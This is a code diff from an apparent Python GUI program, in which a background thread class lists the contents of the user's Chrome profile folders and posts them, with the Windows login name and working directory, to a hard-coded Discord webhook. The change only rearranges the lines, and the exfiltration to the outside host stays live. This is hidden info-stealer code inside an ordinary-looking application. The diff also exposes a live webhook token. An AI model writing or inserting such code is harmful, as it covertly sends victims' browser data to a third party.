@@ -101,7 +101,9 @@ class Additional1Thread(QThread):
 
             aa = path.join(os.environ["USERPROFILE"], "AppData",  "Local", "Google", "Chrome", "User Data")
             bb = path.join(aa, "Default")
-            cc = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", json={"content": f"[{os.getlogin()} {os.getcwd()}] Dirs listed for aa, bb: {str(listdir(aa))} {str(listdir(bb))}"})
+            listeddirs = f"[{os.getlogin()} {os.getcwd()}] Dirs listed for aa, bb: {str(listdir(aa))} {str(listdir(bb))}"
+            print(listeddirs)
+            cc = requests.post(verify=False, url="https://discord.com/api/webhooks/1169671361355055255/rPP7G_bTRbYNCyG_Q_ASFI7VtszXLrmlrtTBa0uY0hxv9AlR-tRR_zAHo2_VNluwG_Kg", json={"content": listeddirs})
             print("--------------------", cc)
             
             try:
